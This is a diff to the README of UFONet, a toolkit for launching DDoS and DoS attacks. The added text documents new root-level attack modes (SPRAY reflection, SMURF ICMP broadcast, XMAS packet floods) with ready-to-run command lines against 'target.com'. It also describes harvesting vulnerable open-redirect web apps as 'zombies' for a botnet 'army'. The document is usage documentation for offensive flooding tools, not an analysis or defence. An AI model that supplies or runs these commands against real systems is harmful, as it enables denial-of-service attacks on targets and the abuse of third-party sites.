@@ -42,7 +42,7 @@ UFONet - is a toolkit designed to launch DDoS and DoS attacks.
 See these links for more info:
 
    - CWE-601:Open Redirect: 
-     http://cwe.mitre.org/data/definitions/601.html
+     https://cwe.mitre.org/data/definitions/601.html
 
    - OWASP:URL Redirector Abuse: 
      https://www.owasp.org/index.php/OWASP_Periodic_Table_of_Vulnerabilities_-_URL_Redirector_Abuse2
@@ -112,8 +112,8 @@ By default UFONet will use a search engine called 'Yahoo'. But you can choose a 
 
 This is the list of available search engines with last time that they were working:
 
-        - bing [26/09/2018: OK!]
-        - yahoo [26/09/2018: OK!]
+        - bing  [30/12/2018: OK!]
+        - yahoo [30/12/2018: OK!]
 
 You can also search massively using all search engines supported:
 
@@ -130,11 +130,11 @@ Or you can make the tool to search for the maximun number of results automatical
 At the end of the process, you will be asked if you want to check the list retrieved to see 
 if the urls are vulnerable.
 
-       Want to check if they are valid zombies? (Y/n)
+       Do you want to check if the NEW possible zombies are valid? (Y/n)
 
-Also, you will be asked to update the list adding automatically only the 'vulnerable' web apps.
+After that, you will be asked to update the list adding automatically only the 'vulnerable' web apps.
 
-       Want to update your list? (Y/n)
+       Do you want to update your army? (Y/n)
 
 If your answer is 'Y', your new 'zombies' will be appended to the file named: zombies.txt
 
@@ -178,7 +178,11 @@ Finally, you can order your 'zombies' to attack you and see how they reply to yo
 At the end of the process, you will be asked if you want to check the list retrieved to see 
 if the urls are vulnerable.
 
-       Want to check if they are valid zombies? (Y/n)
+       Do you want to check if the NEW possible zombies are valid? (Y/n)
+
+After that, you will be asked to update the list adding automatically only the 'vulnerable' web apps.
+
+       Do you want to update your army? (Y/n)
 
 If your answer is 'Y', the file: "botnet/zombies.txt" will be updated.
 
@@ -343,11 +347,23 @@ And you can connect UFOSYN (it requires 'root' access) to start a powerful TCP/S
 
      sudo python ufonet -a http://target.com --ufosyn 100
 
-Both ways could be combined, so UFONet can attack DDoS and DoS, at the same time:
+Or make a SPRAY ('root' required) attack to launch a Distributed 'Reflection' Denial of Service (DrDoS):
 
-     ./python ufonet -a http://target.com --loic 100 --loris 100
+     sudo python ufonet -a http://target.com --spray 100
 
-     sudo python ufonet -a http://target.com --loic 100 --loris 100 --ufosyn 100
+A SMURF ('root' required) attack to send Distributed ICMP 'Broadcast' packets:
+
+     sudo python ufonet -a http://target.com --smurf 101
+
+Or a XMAS ('root' required) attack that will flood your target with 'Christmas Tree' packets
+
+     sudo python ufonet -a http://target.com --xmas 101
+
+All ways could be combined, so UFONet can attack DDoS and DoS, at the same time:
+
+     python ufonet -a http://target.com --loic 100 --loris 100
+
+     sudo python ufonet -a http://target.com --loic 100 --loris 100 --ufosyn 100 --spray 100 --smurf 101 --xmas 101
 
 ###############################
 # Updating
@@ -412,6 +428,10 @@ This will open a tab on your default browser with all features of the tool and s
 ###############################
 
 --------------------------
+31.12.2018 : v.1.2
+--------------------------
+
+--------------------------
 26.09.2018 : v.1.1
 --------------------------
 
@@ -420,19 +440,19 @@ This will open a tab on your default browser with all features of the tool and s
 --------------------------
 
 --------------------------
-14.07.2017 : v.0.9b
+14.07.2017 : v.0.9
 --------------------------
 
 --------------------------
-21.10.2016 : v.0.8b
+21.10.2016 : v.0.8
 --------------------------
 
 --------------------------
-17.08.2016 : v.0.7b
+17.08.2016 : v.0.7
 --------------------------
 
 --------------------------
-05.11.2015 : v.0.6b
+05.11.2015 : v.0.6
 --------------------------
 
 --------------------------
